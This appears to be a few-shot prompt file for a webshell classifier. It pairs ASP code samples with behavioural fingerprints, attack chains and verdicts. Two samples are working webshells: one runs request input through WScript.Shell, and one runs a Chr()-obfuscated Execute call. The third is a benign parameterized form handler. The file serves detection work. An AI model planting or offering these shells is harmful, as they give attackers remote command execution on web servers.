# ASP Webshell — Few-Shot Examples

Use these examples for in-context learning. Always match by behavioral fingerprint similarity.

---

## Example 1: Classic WScript.Shell Webshell

### Code
```asp
<%
    cmd = Request("cmd")
    If cmd <> "" Then
        Set shell = CreateObject("WScript.Shell")
        Set exec = shell.Exec("cmd /c " & cmd)
        Response.Write("<pre>" & exec.StdOut.ReadAll() & "</pre>")
    End If
%>
```

### Behavioral Fingerprint
- [x] Input Channel: `Request()`
- [x] Program Execution: `CreateObject("WScript.Shell").Exec()`
- [ ] Code Execution
- [ ] Obfuscation & Encryption
- [ ] Network Communication
- [ ] Information Gathering

### Attack Chain
`Request("cmd")` → `CreateObject("WScript.Shell")` → `.Exec("cmd /c " & cmd)`

### Verdict: **WebShell**
### Confidence: **99**

---

## Example 2: Chr() Obfuscated Eval

### Code
```asp
<%
    code = Request("code")
    If code <> "" Then
        Execute(Chr(101)&Chr(118)&Chr(97)&Chr(108) & "(""" & code & """)")
    End If
%>
```

### Behavioral Fingerprint
- [x] Input Channel: `Request()`
- [x] Obfuscation: `Chr()` construction
- [x] Code Execution: `Execute()` (with eval constructed from Chr)
- [ ] Program Execution
- [ ] Network Communication
- [ ] Information Gathering

### Attack Chain
`Request("code")` → `Chr()` obfuscation → `Execute()` wrapping eval

### Verdict: **WebShell**
### Confidence: **98**

---

## Example 3: Benign ASP — Contact Form Handler

### Code
```asp
<%
    Dim name, email, message
    name = Request.Form("name")
    email = Request.Form("email")
    message = Request.Form("message")
    
    ' Validate inputs
    If Len(name) > 100 Or Len(message) > 2000 Then
        Response.Write("Invalid input length")
        Response.End
    End If
    
    If InStr(email, "@") = 0 Then
        Response.Write("Invalid email")
        Response.End
    End If
    
    ' Store to database
    Set conn = CreateObject("ADODB.Connection")
    conn.Open Application("DBConnectionString")
    Set cmd = CreateObject("ADODB.Command")
    cmd.ActiveConnection = conn
    cmd.CommandText = "INSERT INTO messages (name, email, message) VALUES (?, ?, ?)"
    cmd.Parameters.Append cmd.CreateParameter("@name", 200, 1, 100, name)
    cmd.Parameters.Append cmd.CreateParameter("@email", 200, 1, 200, email)
    cmd.Parameters.Append cmd.CreateParameter("@message", 201, 1, 2000, message)
    cmd.Execute()
    
    Response.Write("Message sent successfully")
%>
```

### Behavioral Fingerprint
- [x] Input Channel: `Request.Form()`
- [ ] Code Execution
- [ ] Program Execution
- [ ] Obfuscation & Encryption
- [ ] Network Communication: `ADODB.Connection` (database, not C2)
- [ ] Information Gathering

### Attack Chain
**No execution chain.** Input goes through validation (length, email format) and into a parameterized SQL query. No dangerous COM objects are used.

### Verdict: **Benign**
### Confidence: **95**
